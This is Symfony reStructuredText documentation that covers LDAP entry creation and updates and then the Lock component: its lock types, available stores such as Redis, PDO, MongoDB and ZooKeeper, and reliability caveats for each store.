Creating or Updating Entries
----------------------------

The Ldap component provides means to create new LDAP entries, update or even
delete existing ones::

    use Symfony\Component\Ldap\Entry;
    use Symfony\Component\Ldap\Ldap;
    // ...

    $entry = new Entry('cn=Fabien Potencier,dc=symfony,dc=com', [
        'sn' => ['fabpot'],
        'objectClass' => ['inetOrgPerson'],
    ]);

    $entryManager = $ldap->getEntryManager();

    // Creating a new entry
    $entryManager->add($entry);

    // Finding and updating an existing entry
    $query = $ldap->query('dc=symfony,dc=com', '(&(objectclass=person)(ou=Maintainers))');
    $result = $query->execute();
    $entry = $result[0];

    $phoneNumber = $entry->getAttribute('phoneNumber');
    $isContractor = $entry->hasAttribute('contractorCompany');
    // attribute names in getAttribute() and hasAttribute() methods are case-sensitive
    // pass FALSE as the second method argument to make them case-insensitive
    $isContractor = $entry->hasAttribute('contractorCompany', false);

    $entry->setAttribute('email', ['fabpot@symfony.com']);
    $entryManager->update($entry);

    // Adding or removing values to a multi-valued attribute is more efficient than using update()
    $entryManager->addAttributeValues($entry, 'telephoneNumber', ['+1.111.222.3333', '+1.222.333.4444']);
    $entryManager->removeAttributeValues($entry, 'telephoneNumber', ['+1.111.222.3333', '+1.222.333.4444']);

    // Removing an existing entry
    $entryManager->remove(new Entry('cn=Test User,dc=symfony,dc=com'));

Batch Updating
______________

Use the entry manager's :method:`Symfony\\Component\\Ldap\\Adapter\\ExtLdap\\EntryManager::applyOperations`
method to update multiple attributes at once::

    use Symfony\Component\Ldap\Entry;
    use Symfony\Component\Ldap\Ldap;
    // ...

    $entry = new Entry('cn=Fabien Potencier,dc=symfony,dc=com', [
        'sn' => ['fabpot'],
        'objectClass' => ['inetOrgPerson'],
    ]);

    $entryManager = $ldap->getEntryManager();

    // Adding multiple email addresses at once
    $entryManager->applyOperations($entry->getDn(), [
        new UpdateOperation(LDAP_MODIFY_BATCH_ADD, 'mail', 'new1@example.com'),
        new UpdateOperation(LDAP_MODIFY_BATCH_ADD, 'mail', 'new2@example.com'),
    ]);

Possible operation types are ``LDAP_MODIFY_BATCH_ADD``, ``LDAP_MODIFY_BATCH_REMOVE``,
``LDAP_MODIFY_BATCH_REMOVE_ALL``, ``LDAP_MODIFY_BATCH_REPLACE``. Parameter
``$values`` must be ``NULL`` when using ``LDAP_MODIFY_BATCH_REMOVE_ALL``
operation type.
The Lock Component
==================

    The Lock Component creates and manages `locks`_, a mechanism to provide
    exclusive access to a shared resource.

If you're using the Symfony Framework, read the
:doc:`Symfony Framework Lock documentation </lock>`.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/lock

.. include:: /components/require_autoload.rst.inc

Usage
-----

Locks are used to guarantee exclusive access to some shared resource. In
Symfony applications, you can use locks for example to ensure that a command is
not executed more than once at the same time (on the same or different servers).

Locks are created using a :class:`Symfony\\Component\\Lock\\LockFactory` class,
which in turn requires another class to manage the storage of locks::

    use Symfony\Component\Lock\LockFactory;
    use Symfony\Component\Lock\Store\SemaphoreStore;

    $store = new SemaphoreStore();
    $factory = new LockFactory($store);

The lock is created by calling the :method:`Symfony\\Component\\Lock\\LockFactory::createLock`
method. Its first argument is an arbitrary string that represents the locked
resource. Then, a call to the :method:`Symfony\\Component\\Lock\\LockInterface::acquire`
method will try to acquire the lock::

    // ...
    $lock = $factory->createLock('pdf-creation');

    if ($lock->acquire()) {
        // The resource "pdf-creation" is locked.
        // You can compute and generate the invoice safely here.

        $lock->release();
    }

If the lock can not be acquired, the method returns ``false``. The ``acquire()``
method can be safely called repeatedly, even if the lock is already acquired.

.. note::

    Unlike other implementations, the Lock Component distinguishes lock
    instances even when they are created for the same resource. It means that for
    a given scope and resource one lock instance can be acquired multiple times.
    If a lock has to be used by several services, they should share the same ``Lock``
    instance returned by the ``LockFactory::createLock`` method.

.. tip::

    If you don't release the lock explicitly, it will be released automatically
    upon instance destruction. In some cases, it can be useful to lock a resource
    across several requests. To disable the automatic release behavior, set the
    third argument of the ``createLock()`` method to ``false``.

Serializing Locks
-----------------

The :class:`Symfony\\Component\\Lock\\Key` contains the state of the
:class:`Symfony\\Component\\Lock\\Lock` and can be serialized. This
allows the user to begin a long job in a process by acquiring the lock, and
continue the job in another process using the same lock.

First, you may create a serializable class containing the resource and the
key of the lock::

    // src/Lock/RefreshTaxonomy.php
    namespace App\Lock;

    use Symfony\Component\Lock\Key;

    class RefreshTaxonomy
    {
        public function __construct(
            private object $article,
            private Key $key,
        ) {
        }

        public function getArticle(): object
        {
            return $this->article;
        }

        public function getKey(): Key
        {
            return $this->key;
        }
    }

Then, you can use this class to dispatch all that's needed for another process
to handle the rest of the job::

    use App\Lock\RefreshTaxonomy;
    use Symfony\Component\Lock\Key;
    use Symfony\Component\Lock\Lock;

    $key = new Key('article.'.$article->getId());
    $lock = new Lock(
        $key,
        $this->store,
        300,  // ttl
        false // autoRelease
    );
    $lock->acquire(true);

    $this->bus->dispatch(new RefreshTaxonomy($article, $key));

.. note::

    Don't forget to set the ``autoRelease`` argument to ``false`` in the
    ``Lock`` constructor to avoid releasing the lock when the destructor is
    called.

Not all stores are compatible with serialization and cross-process locking: for
example, the kernel will automatically release semaphores acquired by the
:ref:`SemaphoreStore <lock-store-semaphore>` store. If you use an incompatible
store (see :ref:`lock stores <lock-stores>` for supported stores), an
exception will be thrown when the application tries to serialize the key.

.. _lock-blocking-locks:

Blocking Locks
--------------

By default, when a lock cannot be acquired, the ``acquire`` method returns
``false`` immediately. To wait (indefinitely) until the lock can be created,
pass ``true`` as the argument of the ``acquire()`` method. This is called a
**blocking lock** because the execution of your application stops until the
lock is acquired::

    use Symfony\Component\Lock\LockFactory;
    use Symfony\Component\Lock\Store\FlockStore;

    $store = new FlockStore('/var/stores');
    $factory = new LockFactory($store);

    $lock = $factory->createLock('pdf-creation');
    $lock->acquire(true);

When the store does not support blocking locks by implementing the
:class:`Symfony\\Component\\Lock\\BlockingStoreInterface` interface (see
:ref:`lock stores <lock-stores>` for supported stores), the ``Lock`` class
will retry to acquire the lock in a non-blocking way until the lock is
acquired.

Expiring Locks
--------------

Locks created remotely are difficult to manage because there is no way for the
remote ``Store`` to know if the locker process is still alive. Due to bugs,
fatal errors or segmentation faults, it cannot be guaranteed that the
``release()`` method will be called, which would cause the resource to be
locked infinitely.

The best solution in those cases is to create **expiring locks**, which are
released automatically after some amount of time has passed (called TTL for
*Time To Live*). This time, in seconds, is configured as the second argument of
the ``createLock()`` method. If needed, these locks can also be released early
with the ``release()`` method.

The trickiest part when working with expiring locks is choosing the right TTL.
If it's too short, other processes could acquire the lock before finishing the
job; if it's too long and the process crashes before calling the ``release()``
method, the resource will stay locked until the timeout::

    // ...
    // create an expiring lock that lasts 30 seconds (default is 300.0)
    $lock = $factory->createLock('pdf-creation', ttl: 30);

    if (!$lock->acquire()) {
        return;
    }
    try {
        // perform a job during less than 30 seconds
    } finally {
        $lock->release();
    }

.. tip::

    To avoid leaving the lock in a locked state, it's recommended to wrap the
    job in a try/catch/finally block to always try to release the expiring lock.

In case of long-running tasks, it's better to start with a not too long TTL and
then use the :method:`Symfony\\Component\\Lock\\LockInterface::refresh` method
to reset the TTL to its original value::

    // ...
    $lock = $factory->createLock('pdf-creation', ttl: 30);

    if (!$lock->acquire()) {
        return;
    }
    try {
        while (!$finished) {
            // perform a small part of the job.

            // renew the lock for 30 more seconds.
            $lock->refresh();
        }
    } finally {
        $lock->release();
    }

.. tip::

    Another useful technique for long-running tasks is to pass a custom TTL as
    an argument of the ``refresh()`` method to change the default lock TTL::

        $lock = $factory->createLock('pdf-creation', ttl: 30);
        // ...
        // refresh the lock for 30 seconds
        $lock->refresh();
        // ...
        // refresh the lock for 600 seconds (next refresh() call will be 30 seconds again)
        $lock->refresh(600);

This component also provides two useful methods related to expiring locks:
``getRemainingLifetime()`` (which returns ``null`` or a ``float``
as seconds) and ``isExpired()`` (which returns a boolean).

Automatically Releasing The Lock
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Locks are automatically released when their Lock objects are destroyed. This is
an implementation detail that is important when sharing Locks between
processes. In the example below, ``pcntl_fork()`` creates two processes and the
Lock will be released automatically as soon as one process finishes::

    // ...
    $lock = $factory->createLock('pdf-creation');
    if (!$lock->acquire()) {
        return;
    }

    $pid = pcntl_fork();
    if (-1 === $pid) {
        // Could not fork
        exit(1);
    } elseif ($pid) {
        // Parent process
        sleep(30);
    } else {
        // Child process
        echo 'The lock will be released now.';
        exit(0);
    }
    // ...

.. note::

    In order for the above example to work, the `PCNTL`_ extension must be
    installed.

To disable this behavior, set the ``autoRelease`` argument of
``LockFactory::createLock()`` to ``false``. That will make the lock acquired
for 3600 seconds or until ``Lock::release()`` is called::

    $lock = $factory->createLock(
        'pdf-creation',
        3600, // ttl
        false // autoRelease
    );

Shared Locks
------------

A shared or `readers-writer lock`_ is a synchronization primitive that allows
concurrent access for read-only operations, while write operations require
exclusive access. This means that multiple threads can read the data in parallel
but an exclusive lock is needed for writing or modifying data. They are used for
example for data structures that cannot be updated atomically and are invalid
until the update is complete.

Use the :method:`Symfony\\Component\\Lock\\SharedLockInterface::acquireRead`
method to acquire a read-only lock, and
:method:`Symfony\\Component\\Lock\\LockInterface::acquire` method to acquire a
write lock::

    $lock = $factory->createLock('user-'.$user->id);
    if (!$lock->acquireRead()) {
        return;
    }

Similar to the ``acquire()`` method, pass ``true`` as the argument of ``acquireRead()``
to acquire the lock in a blocking mode::

    $lock = $factory->createLock('user-'.$user->id);
    $lock->acquireRead(true);

.. note::

    The `priority policy`_ of Symfony's shared locks depends on the underlying
    store (e.g. Redis store prioritizes readers vs writers).

When a read-only lock is acquired with the ``acquireRead()`` method, it's
possible to **promote** the lock, and change it to a write lock, by calling the
``acquire()`` method::

    $lock = $factory->createLock('user-'.$userId);
    $lock->acquireRead(true);

    if (!$this->shouldUpdate($userId)) {
        return;
    }

    $lock->acquire(true); // Promote the lock to a write lock
    $this->update($userId);

In the same way, it's possible to **demote** a write lock, and change it to a
read-only lock by calling the ``acquireRead()`` method.

When the provided store does not implement the
:class:`Symfony\\Component\\Lock\\SharedLockStoreInterface` interface (see
:ref:`lock stores <lock-stores>` for supported stores), the ``Lock`` class
will fallback to a write lock by calling the ``acquire()`` method.

The Owner of The Lock
---------------------

Locks that are acquired for the first time are :ref:`owned <lock-owner-technical-details>` by the ``Lock`` instance that acquired
it. If you need to check whether the current ``Lock`` instance is (still) the owner of
a lock, you can use the ``isAcquired()`` method::

    if ($lock->isAcquired()) {
        // We (still) own the lock
    }

Because some lock stores have expiring locks, it is possible for an instance to
lose the lock it acquired automatically::

    // If we cannot acquire ourselves, it means some other process is already working on it
    if (!$lock->acquire()) {
        return;
    }

    $this->beginTransaction();

    // Perform a very long process that might exceed TTL of the lock

    if ($lock->isAcquired()) {
        // Still all good, no other instance has acquired the lock in the meantime, we're safe
        $this->commit();
    } else {
        // Bummer! Our lock has apparently exceeded TTL and another process has started in
        // the meantime so it's not safe for us to commit.
        $this->rollback();
        throw new \Exception('Process failed');
    }

.. caution::

    A common pitfall might be to use the ``isAcquired()`` method to check if
    a lock has already been acquired by any process. As you can see in this example
    you have to use ``acquire()`` for this. The ``isAcquired()`` method is used to check
    if the lock has been acquired by the **current process** only.

.. _lock-owner-technical-details:

.. note::

    Technically, the true owners of the lock are the ones that share the same instance of ``Key``,
    not ``Lock``. But from a user perspective, ``Key`` is internal and you will likely only be working
    with the ``Lock`` instance so it's easier to think of the ``Lock`` instance as being the one that
    is the owner of the lock.

.. _lock-stores:

Available Stores
----------------

Locks are created and managed in ``Stores``, which are classes that implement
:class:`Symfony\\Component\\Lock\\PersistingStoreInterface` and, optionally,
:class:`Symfony\\Component\\Lock\\BlockingStoreInterface`.

The component includes the following built-in store types:

==========================================================  ======  ========  ======== =======
Store                                                       Scope   Blocking  Expiring Sharing
==========================================================  ======  ========  ======== =======
:ref:`FlockStore <lock-store-flock>`                        local   yes       no       yes
:ref:`MemcachedStore <lock-store-memcached>`                remote  no        yes      no
:ref:`MongoDbStore <lock-store-mongodb>`                    remote  no        yes      no
:ref:`PdoStore <lock-store-pdo>`                            remote  no        yes      no
:ref:`DoctrineDbalStore <lock-store-dbal>`                  remote  no        yes      no
:ref:`PostgreSqlStore <lock-store-pgsql>`                   remote  yes       no       yes
:ref:`DoctrineDbalPostgreSqlStore <lock-store-dbal-pgsql>`  remote  yes       no       yes
:ref:`RedisStore <lock-store-redis>`                        remote  no        yes      yes
:ref:`SemaphoreStore <lock-store-semaphore>`                local   yes       no       no
:ref:`ZookeeperStore <lock-store-zookeeper>`                remote  no        no       no
==========================================================  ======  ========  ======== =======

.. tip::

    A special ``InMemoryStore`` is available for saving locks in memory during
    a process, and can be useful for testing.

.. _lock-store-flock:

FlockStore
~~~~~~~~~~

The FlockStore uses the file system on the local computer to create the locks.
It does not support expiration, but the lock is automatically released when the
lock object goes out of scope and is freed by the garbage collector (for example
when the PHP process ends)::

    use Symfony\Component\Lock\Store\FlockStore;

    // the argument is the path of the directory where the locks are created
    // if none is given, sys_get_temp_dir() is used internally.
    $store = new FlockStore('/var/stores');

.. caution::

    Beware that some file systems (such as some types of NFS) do not support
    locking. In those cases, it's better to use a directory on a local disk
    drive or a remote store.

.. _lock-store-memcached:

MemcachedStore
~~~~~~~~~~~~~~

The MemcachedStore saves locks on a Memcached server, it requires a Memcached
connection implementing the ``\Memcached`` class. This store does not
support blocking, and expects a TTL to avoid stalled locks::

    use Symfony\Component\Lock\Store\MemcachedStore;

    $memcached = new \Memcached();
    $memcached->addServer('localhost', 11211);

    $store = new MemcachedStore($memcached);

.. note::

    Memcached does not support TTL lower than 1 second.

.. _lock-store-mongodb:

MongoDbStore
~~~~~~~~~~~~

The MongoDbStore saves locks on a MongoDB server ``>=2.2``, it requires a
``\MongoDB\Collection`` or ``\MongoDB\Client`` from `mongodb/mongodb`_ or a
`MongoDB Connection String`_.
This store does not support blocking and expects a TTL to
avoid stalled locks::

    use Symfony\Component\Lock\Store\MongoDbStore;

    $mongo = 'mongodb://localhost/database?collection=lock';
    $options = [
        'gcProbability' => 0.001,
        'database' => 'myapp',
        'collection' => 'lock',
        'uriOptions' => [],
        'driverOptions' => [],
    ];
    $store = new MongoDbStore($mongo, $options);

The ``MongoDbStore`` takes the following ``$options`` (depending on the first parameter type):

=============  ================================================================================================
Option         Description
=============  ================================================================================================
gcProbability  Should a TTL Index be created expressed as a probability from 0.0 to 1.0 (Defaults to ``0.001``)
database       The name of the database
collection     The name of the collection
uriOptions     Array of URI options for `MongoDBClient::__construct`_
driverOptions  Array of driver options for `MongoDBClient::__construct`_
=============  ================================================================================================

When the first parameter is a:

``MongoDB\Collection``:

- ``$options['database']`` is ignored
- ``$options['collection']`` is ignored

``MongoDB\Client``:

- ``$options['database']`` is mandatory
- ``$options['collection']`` is mandatory

MongoDB Connection String:

- ``$options['database']`` is used otherwise ``/path`` from the DSN, at least one is mandatory
- ``$options['collection']`` is used otherwise ``?collection=`` from the DSN, at least one is mandatory

.. note::

    The ``collection`` querystring parameter is not part of the `MongoDB Connection String`_ definition.
    It is used to allow constructing a ``MongoDbStore`` using a `Data Source Name (DSN)`_ without ``$options``.

.. _lock-store-pdo:

PdoStore
~~~~~~~~

The PdoStore saves locks in an SQL database. It requires a `PDO`_ connection or a `Data Source Name (DSN)`_.
This store does not support blocking, and expects a TTL to avoid stalled locks::

    use Symfony\Component\Lock\Store\PdoStore;

    // a PDO instance or DSN for lazy connecting through PDO
    $databaseConnectionOrDSN = 'mysql:host=127.0.0.1;dbname=app';
    $store = new PdoStore($databaseConnectionOrDSN, ['db_username' => 'myuser', 'db_password' => 'mypassword']);

.. note::

    This store does not support TTL lower than 1 second.

The table where values are stored is created automatically on the first call to
the :method:`Symfony\\Component\\Lock\\Store\\PdoStore::save` method.
You can also create this table explicitly by calling the
:method:`Symfony\\Component\\Lock\\Store\\PdoStore::createTable` method in
your code.

.. _lock-store-dbal:

DoctrineDbalStore
~~~~~~~~~~~~~~~~~

The DoctrineDbalStore saves locks in an SQL database. It is identical to PdoStore
but requires a `Doctrine DBAL Connection`_, or a `Doctrine DBAL URL`_. This store
does not support blocking, and expects a TTL to avoid stalled locks::

    use Symfony\Component\Lock\Store\DoctrineDbalStore;

    // a Doctrine DBAL connection or DSN
    $connectionOrURL = 'mysql://myuser:mypassword@127.0.0.1/app';
    $store = new DoctrineDbalStore($connectionOrURL);

.. note::

    This store does not support TTL lower than 1 second.

The table where values are stored will be automatically generated when your run
the command:

.. code-block:: terminal

    $ php bin/console make:migration

If you prefer to create the table yourself and it has not already been created, you can
create this table explicitly by calling the
:method:`Symfony\\Component\\Lock\\Store\\DoctrineDbalStore::createTable` method.
You can also add this table to your schema by calling
:method:`Symfony\\Component\\Lock\\Store\\DoctrineDbalStore::configureSchema` method
in your code

If the table has not been created upstream, it will be created automatically on the first call to
the :method:`Symfony\\Component\\Lock\\Store\\DoctrineDbalStore::save` method.

.. _lock-store-pgsql:

PostgreSqlStore
~~~~~~~~~~~~~~~

The PostgreSqlStore uses `Advisory Locks`_ provided by PostgreSQL. It requires a
`PDO`_ connection or a `Data Source Name (DSN)`_. It supports native blocking, as well as sharing
locks::

    use Symfony\Component\Lock\Store\PostgreSqlStore;

    // a PDO instance or DSN for lazy connecting through PDO
    $databaseConnectionOrDSN = 'pgsql:host=localhost;port=5634;dbname=app';
    $store = new PostgreSqlStore($databaseConnectionOrDSN, ['db_username' => 'myuser', 'db_password' => 'mypassword']);

In opposite to the ``PdoStore``, the ``PostgreSqlStore`` does not need a table to
store locks and it does not expire.

.. _lock-store-dbal-pgsql:

DoctrineDbalPostgreSqlStore
~~~~~~~~~~~~~~~~~~~~~~~~~~~

The DoctrineDbalPostgreSqlStore uses `Advisory Locks`_ provided by PostgreSQL.
It is identical to PostgreSqlStore but requires a `Doctrine DBAL Connection`_ or
a `Doctrine DBAL URL`_. It supports native blocking, as well as sharing locks::

    use Symfony\Component\Lock\Store\DoctrineDbalPostgreSqlStore;

    // a Doctrine Connection or DSN
    $databaseConnectionOrDSN = 'postgresql+advisory://myuser:mypassword@127.0.0.1:5634/lock';
    $store = new DoctrineDbalPostgreSqlStore($databaseConnectionOrDSN);

In opposite to the ``DoctrineDbalStore``, the ``DoctrineDbalPostgreSqlStore`` does not need a table to
store locks and does not expire.

.. _lock-store-redis:

RedisStore
~~~~~~~~~~

The RedisStore saves locks on a Redis server, it requires a Redis connection
implementing the ``\Redis``, ``\RedisArray``, ``\RedisCluster``, ``\Relay\Relay`` or
``\Predis`` classes. This store does not support blocking, and expects a TTL to
avoid stalled locks::

    use Symfony\Component\Lock\Store\RedisStore;

    $redis = new \Redis();
    $redis->connect('localhost');

    $store = new RedisStore($redis);

.. _lock-store-semaphore:

SemaphoreStore
~~~~~~~~~~~~~~

The SemaphoreStore uses the `PHP semaphore functions`_ to create the locks::

    use Symfony\Component\Lock\Store\SemaphoreStore;

    $store = new SemaphoreStore();

.. _lock-store-combined:

CombinedStore
~~~~~~~~~~~~~

The CombinedStore is designed for High Availability applications because it
manages several stores in sync (for example, several Redis servers). When a
lock is acquired, it forwards the call to all the managed stores, and it
collects their responses. If a simple majority of stores have acquired the
lock, then the lock is considered acquired::

    use Symfony\Component\Lock\Store\CombinedStore;
    use Symfony\Component\Lock\Store\RedisStore;
    use Symfony\Component\Lock\Strategy\ConsensusStrategy;

    $stores = [];
    foreach (['server1', 'server2', 'server3'] as $server) {
        $redis = new \Redis();
        $redis->connect($server);

        $stores[] = new RedisStore($redis);
    }

    $store = new CombinedStore($stores, new ConsensusStrategy());

Instead of the simple majority strategy (``ConsensusStrategy``) an
``UnanimousStrategy`` can be used to require the lock to be acquired in all
the stores::

    use Symfony\Component\Lock\Store\CombinedStore;
    use Symfony\Component\Lock\Strategy\UnanimousStrategy;

    $store = new CombinedStore($stores, new UnanimousStrategy());

.. caution::

    In order to get high availability when using the ``ConsensusStrategy``, the
    minimum cluster size must be three servers. This allows the cluster to keep
    working when a single server fails (because this strategy requires that the
    lock is acquired for more than half of the servers).

.. _lock-store-zookeeper:

ZookeeperStore
~~~~~~~~~~~~~~

The ZookeeperStore saves locks on a `ZooKeeper`_ server. It requires a ZooKeeper
connection implementing the ``\Zookeeper`` class. This store does not
support blocking and expiration but the lock is automatically released when the
PHP process is terminated::

    use Symfony\Component\Lock\Store\ZookeeperStore;

    $zookeeper = new \Zookeeper('localhost:2181');
    // use the following to define a high-availability cluster:
    // $zookeeper = new \Zookeeper('localhost1:2181,localhost2:2181,localhost3:2181');

    $store = new ZookeeperStore($zookeeper);

.. note::

    Zookeeper does not require a TTL as the nodes used for locking are ephemeral
    and die when the PHP process is terminated.

Reliability
-----------

The component guarantees that the same resource can't be locked twice as long as
the component is used in the following way.

Remote Stores
~~~~~~~~~~~~~

Remote stores (:ref:`MemcachedStore <lock-store-memcached>`,
:ref:`MongoDbStore <lock-store-mongodb>`,
:ref:`PdoStore <lock-store-pdo>`,
:ref:`PostgreSqlStore <lock-store-pgsql>`,
:ref:`RedisStore <lock-store-redis>` and
:ref:`ZookeeperStore <lock-store-zookeeper>`) use a unique token to recognize
the true owner of the lock. This token is stored in the
:class:`Symfony\\Component\\Lock\\Key` object and is used internally by
the ``Lock``.

Every concurrent process must store the ``Lock`` on the same server. Otherwise two
different machines may allow two different processes to acquire the same ``Lock``.

.. caution::

    To guarantee that the same server will always be safe, do not use Memcached
    behind a LoadBalancer, a cluster or round-robin DNS. Even if the main server
    is down, the calls must not be forwarded to a backup or failover server.

Expiring Stores
~~~~~~~~~~~~~~~

Expiring stores (:ref:`MemcachedStore <lock-store-memcached>`,
:ref:`MongoDbStore <lock-store-mongodb>`,
:ref:`PdoStore <lock-store-pdo>` and
:ref:`RedisStore <lock-store-redis>`)
guarantee that the lock is acquired only for the defined duration of time. If
the task takes longer to be accomplished, then the lock can be released by the
store and acquired by someone else.

The ``Lock`` provides several methods to check its health. The ``isExpired()``
method checks whether or not its lifetime is over and the ``getRemainingLifetime()``
method returns its time to live in seconds.

Using the above methods, a robust code would be::

    // ...
    $lock = $factory->createLock('pdf-creation', 30);

    if (!$lock->acquire()) {
        return;
    }
    while (!$finished) {
        if ($lock->getRemainingLifetime() <= 5) {
            if ($lock->isExpired()) {
                // lock was lost, perform a rollback or send a notification
                throw new \RuntimeException('Lock lost during the overall process');
            }

            $lock->refresh();
        }

        // Perform the task whose duration MUST be less than 5 minutes
    }

.. caution::

    Choose wisely the lifetime of the ``Lock`` and check whether its remaining
    time to live is enough to perform the task.

.. caution::

    Storing a ``Lock`` usually takes a few milliseconds, but network conditions
    may increase that time a lot (up to a few seconds). Take that into account
    when choosing the right TTL.

By design, locks are stored on servers with a defined lifetime. If the date or
time of the machine changes, a lock could be released sooner than expected.

.. caution::

    To guarantee that date won't change, the NTP service should be disabled
    and the date should be updated when the service is stopped.

FlockStore
~~~~~~~~~~

By using the file system, this ``Store`` is reliable as long as concurrent
processes use the same physical directory to store locks.

Processes must run on the same machine, virtual machine or container.
Be careful when updating a Kubernetes or Swarm service because, for a short
period of time, there can be two containers running in parallel.

The absolute path to the directory must remain the same. Be careful of symlinks
that could change at anytime: Capistrano and blue/green deployment often use
that trick. Be careful when the path to that directory changes between two
deployments.

Some file systems (such as some types of NFS) do not support locking.

.. caution::

    All concurrent processes must use the same physical file system by running
    on the same machine and using the same absolute path to the lock directory.

    Using a ``FlockStore`` in an HTTP context is incompatible with multiple
    front servers, unless to ensure that the same resource will always be
    locked on the same machine or to use a well configured shared file system.

Files on the file system can be removed during a maintenance operation. For
instance, to clean up the ``/tmp`` directory or after a reboot of the machine
when a directory uses ``tmpfs``. It's not an issue if the lock is released when
the process ended, but it is in case of ``Lock`` reused between requests.

.. danger::

    Do not store locks on a volatile file system if they have to be reused in
    several requests.

MemcachedStore
~~~~~~~~~~~~~~

The way Memcached works is to store items in memory. That means that by using
the :ref:`MemcachedStore <lock-store-memcached>` the locks are not persisted
and may disappear by mistake at any time.

If the Memcached service or the machine hosting it restarts, every lock would
be lost without notifying the running processes.

.. caution::

    To avoid that someone else acquires a lock after a restart, it's recommended
    to delay service start and wait at least as long as the longest lock TTL.

By default Memcached uses a LRU mechanism to remove old entries when the service
needs space to add new items.

.. caution::

    The number of items stored in Memcached must be under control. If it's not
    possible, LRU should be disabled and Lock should be stored in a dedicated
    Memcached service away from Cache.

When the Memcached service is shared and used for multiple usage, Locks could be
removed by mistake. For instance some implementation of the PSR-6 ``clear()``
method uses the Memcached's ``flush()`` method which purges and removes everything.

.. danger::

    The method ``flush()`` must not be called, or locks should be stored in a
    dedicated Memcached service away from Cache.

MongoDbStore
~~~~~~~~~~~~

.. caution::

    The locked resource name is indexed in the ``_id`` field of the lock
    collection. Beware that an indexed field's value in MongoDB can be
    `a maximum of 1024 bytes in length`_ including the structural overhead.

A TTL index must be used to automatically clean up expired locks.
Such an index can be created manually:

.. code-block:: javascript

    db.lock.createIndex(
        { "expires_at": 1 },
        { "expireAfterSeconds": 0 }
    )

Alternatively, the method ``MongoDbStore::createTtlIndex(int $expireAfterSeconds = 0)``
can be called once to create the TTL index during database setup. Read more
about `Expire Data from Collections by Setting TTL`_ in MongoDB.

.. tip::

    ``MongoDbStore`` will attempt to automatically create a TTL index. It's
    recommended to set constructor option ``gcProbability`` to ``0.0`` to
    disable this behavior if you have manually dealt with TTL index creation.

.. caution::

    This store relies on all PHP application and database nodes to have
    synchronized clocks for lock expiry to occur at the correct time. To ensure
    locks don't expire prematurely; the lock TTL should be set with enough extra
    time in ``expireAfterSeconds`` to account for any clock drift between nodes.

``writeConcern`` and ``readConcern`` are not specified by MongoDbStore meaning
the collection's settings will take effect.
``readPreference`` is ``primary`` for all queries.
Read more about `Replica Set Read and Write Semantics`_ in MongoDB.

PdoStore
~~~~~~~~

The PdoStore relies on the `ACID`_ properties of the SQL engine.

.. caution::

    In a cluster configured with multiple primaries, ensure writes are
    synchronously propagated to every node, or always use the same node.

.. caution::

    Some SQL engines like MySQL allow to disable the unique constraint check.
    Ensure that this is not the case ``SET unique_checks=1;``.

In order to purge old locks, this store uses a current datetime to define an
expiration date reference. This mechanism relies on all server nodes to
have synchronized clocks.

.. caution::

    To ensure locks don't expire prematurely; the TTLs should be set with
    enough extra time to account for any clock drift between nodes.

PostgreSqlStore
~~~~~~~~~~~~~~~

The PostgreSqlStore relies on the `Advisory Locks`_ properties of the PostgreSQL
database. That means that by using :ref:`PostgreSqlStore <lock-store-pgsql>`
the locks will be automatically released at the end of the session in case the
client cannot unlock for any reason.

If the PostgreSQL service or the machine hosting it restarts, every lock would
be lost without notifying the running processes.

If the TCP connection is lost, the PostgreSQL may release locks without
notifying the application.

RedisStore
~~~~~~~~~~

The way Redis works is to store items in memory. That means that by using
the :ref:`RedisStore <lock-store-redis>` the locks are not persisted
and may disappear by mistake at any time.

If the Redis service or the machine hosting it restarts, every locks would
be lost without notifying the running processes.

.. caution::

    To avoid that someone else acquires a lock after a restart, it's recommended
    to delay service start and wait at least as long as the longest lock TTL.

.. tip::

    Redis can be configured to persist items on disk, but this option would
    slow down writes on the service. This could go against other uses of the
    server.

When the Redis service is shared and used for multiple usages, locks could be
removed by mistake.

.. danger::

    The command ``FLUSHDB`` must not be called, or locks should be stored in a
    dedicated Redis service away from Cache.

CombinedStore
~~~~~~~~~~~~~

Combined stores allow the storage of locks across several backends. It's a common
mistake to think that the lock mechanism will be more reliable. This is wrong.
The ``CombinedStore`` will be, at best, as reliable as the least reliable of
all managed stores. As soon as one managed store returns erroneous information,
the ``CombinedStore`` won't be reliable.

.. caution::

    All concurrent processes must use the same configuration, with the same
    amount of managed stored and the same endpoint.

.. tip::

    Instead of using a cluster of Redis or Memcached servers, it's better to use
    a ``CombinedStore`` with a single server per managed store.

SemaphoreStore
~~~~~~~~~~~~~~

Semaphores are handled by the Kernel level. In order to be reliable, processes
must run on the same machine, virtual machine or container. Be careful when
updating a Kubernetes or Swarm service because for a short period of time, there
can be two running containers in parallel.

.. caution::

    All concurrent processes must use the same machine. Before starting a
    concurrent process on a new machine, check that other processes are stopped
    on the old one.

.. caution::

    When running on systemd with non-system user and option ``RemoveIPC=yes``
    (default value), locks are deleted by systemd when that user logs out.
    Check that process is run with a system user (UID <= SYS_UID_MAX) with
    ``SYS_UID_MAX`` defined in ``/etc/login.defs``, or set the option
    ``RemoveIPC=off`` in ``/etc/systemd/logind.conf``.

ZookeeperStore
~~~~~~~~~~~~~~

The way ZookeeperStore works is by maintaining locks as ephemeral nodes on the
server. That means that by using :ref:`ZookeeperStore <lock-store-zookeeper>`
the locks will be automatically released at the end of the session in case the
client cannot unlock for any reason.

If the ZooKeeper service or the machine hosting it restarts, every lock would
be lost without notifying the running processes.

.. tip::

    To use ZooKeeper's high-availability feature, you can setup a cluster of
    multiple servers so that in case one of the server goes down, the majority
    will still be up and serving the requests. All the available servers in the
    cluster will see the same state.

.. note::

    As this store does not support multi-level node locks, since the clean up of
    intermediate nodes becomes an overhead, all locks are maintained at the root
    level.

Overall
~~~~~~~

Changing the configuration of stores should be done very carefully. For
instance, during the deployment of a new version. Processes with new
configuration must not be started while old processes with old configuration
are still running.

.. _`a maximum of 1024 bytes in length`: https://docs.mongodb.com/manual/reference/limits/#Index-Key-Limit
.. _`ACID`: https://en.wikipedia.org/wiki/ACID
.. _`Advisory Locks`: https://www.postgresql.org/docs/current/explicit-locking.html
.. _`Data Source Name (DSN)`: https://en.wikipedia.org/wiki/Data_source_name
.. _`Doctrine DBAL Connection`: https://github.com/doctrine/dbal/blob/master/src/Connection.php
.. _`Doctrine DBAL URL`: https://www.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/configuration.html#connecting-using-a-url
.. _`Expire Data from Collections by Setting TTL`: https://docs.mongodb.com/manual/tutorial/expire-data/
